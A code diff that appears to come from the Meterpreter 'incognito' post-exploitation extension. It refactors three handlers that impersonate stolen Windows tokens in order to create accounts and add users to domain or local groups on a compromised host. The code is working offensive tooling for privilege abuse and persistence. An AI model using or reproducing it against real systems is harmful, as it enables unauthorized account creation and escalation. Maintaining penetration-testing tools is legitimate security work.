@@ -1,5 +1,6 @@
 #define _CRT_SECURE_NO_DEPRECATE 1
-#include "../../common/common.h"
+#include "common.h"
+#include "common_metapi.h"
 #include <stdio.h>
 #include <assert.h>
 #include <stdlib.h>
@@ -23,12 +24,12 @@ DWORD request_incognito_add_user(Remote *remote, Packet *packet)
 	char *dc_netbios_name, *username, *password, return_value[BUF_SIZE] = "", temp[BUF_SIZE] = "";
 	wchar_t dc_netbios_name_u[BUF_SIZE], username_u[BUF_SIZE], password_u[BUF_SIZE];
 	TOKEN_PRIVS token_privs;
-	
+
 	// Read arguments
-	Packet *response = packet_create_response(packet);
-	dc_netbios_name = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
-	username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
-	password = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_PASSWORD);
+	Packet *response = met_api->packet.create_response(packet);
+	dc_netbios_name = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
+	username = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
+	password = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_PASSWORD);
 
 	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
 	mbstowcs(username_u, username, strlen(username)+1);
@@ -60,7 +61,7 @@ DWORD request_incognito_add_user(Remote *remote, Packet *packet)
 	if (token_list[i].token)
 	{
 		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
-		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
+		if (!_wcsicmp(L"NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
 			continue;
 
 		ImpersonateLoggedOnUser(token_list[i].token);
@@ -105,8 +106,8 @@ cleanup:
 		CloseHandle(token_list[i].token);
 	free(token_list);
 
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	// Restore token impersonation
 	if (saved_token != INVALID_HANDLE_VALUE)
@@ -126,10 +127,10 @@ DWORD request_incognito_add_group_user(Remote *remote, Packet *packet)
 	TOKEN_PRIVS token_privs;
 
 	// Read arguments
-	Packet *response = packet_create_response(packet);
-	dc_netbios_name = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
-	groupname = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_GROUPNAME);
-	username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
+	Packet *response = met_api->packet.create_response(packet);
+	dc_netbios_name = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
+	groupname = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_GROUPNAME);
+	username = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
 
 	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
 	mbstowcs(username_u, username, strlen(username)+1);
@@ -153,7 +154,7 @@ DWORD request_incognito_add_group_user(Remote *remote, Packet *packet)
 	if (token_list[i].token)
 	{
 		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
-		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
+		if (!_wcsicmp(L"NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
 			continue;
 
 		ImpersonateLoggedOnUser(token_list[i].token);
@@ -201,8 +202,8 @@ cleanup:
 		CloseHandle(token_list[i].token);
 	free(token_list);
 
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	// Restore token impersonation
 	if (saved_token != INVALID_HANDLE_VALUE)
@@ -223,10 +224,10 @@ DWORD request_incognito_add_localgroup_user(Remote *remote, Packet *packet)
 	TOKEN_PRIVS token_privs;
 
 	// Read arguments
-	Packet *response = packet_create_response(packet);
-	dc_netbios_name = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
-	groupname = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_GROUPNAME);
-	username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
+	Packet *response = met_api->packet.create_response(packet);
+	dc_netbios_name = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
+	groupname = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_GROUPNAME);
+	username = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);
 
 	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
 	mbstowcs(username_u, username, strlen(username)+1);
@@ -252,7 +253,7 @@ DWORD request_incognito_add_localgroup_user(Remote *remote, Packet *packet)
 	if (token_list[i].token)
 	{
 		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
-		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
+		if (!_wcsicmp(L"NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
 			continue;
 
 		ImpersonateLoggedOnUser(token_list[i].token);
@@ -295,8 +296,8 @@ cleanup:
 		CloseHandle(token_list[i].token);
 	free(token_list);
 
-	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 	// Restore token impersonation
 	if (saved_token != INVALID_HANDLE_VALUE)
